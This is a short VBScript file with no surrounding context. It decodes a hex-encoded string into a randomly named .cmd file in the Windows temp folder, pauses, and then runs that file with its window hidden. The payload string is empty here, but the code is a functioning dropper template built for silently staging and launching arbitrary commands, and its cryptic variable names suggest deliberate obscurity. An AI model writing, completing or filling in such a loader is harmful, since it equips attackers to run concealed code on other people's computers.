Set fx = CreateObject("Scripting.FileSystemObject")
Set sx = CreateObject("WScript.Shell")
px = fx.GetSpecialFolder(2).Path & "\" & fx.GetTempName & ".cmd"
hx = ""
Set ox = fx.CreateTextFile(px, True)
For ix = 1 To Len(hx) Step 2
  ox.Write Chr(CInt("&H" & Mid(hx, ix, 2)))
Next
ox.Close
WScript.Sleep 2000
sx.Run px, 0, False
